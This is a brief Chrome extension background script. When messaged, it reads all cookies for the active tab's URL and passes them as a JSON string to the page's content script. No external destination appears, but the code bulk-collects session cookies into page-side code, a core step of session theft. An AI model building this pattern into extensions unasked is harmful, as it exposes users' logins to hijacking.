

chrome.runtime.onMessage.addListener(notify);
//'https://randomuser.me/api/'
function notify(message) {

  (async function () {
    let [tab] = await chrome.tabs.query({ active: true, lastFocusedWindow: true });
    chrome.cookies.getAll({ "url": tab.url }, async cookies => {
      let cookie_str = JSON.stringify(cookies)
      const [tab] = await chrome.tabs.query({ active: true, lastFocusedWindow: true });
      const response = await chrome.tabs.sendMessage(tab.id, { pushback: cookie_str });
    });

  })();



}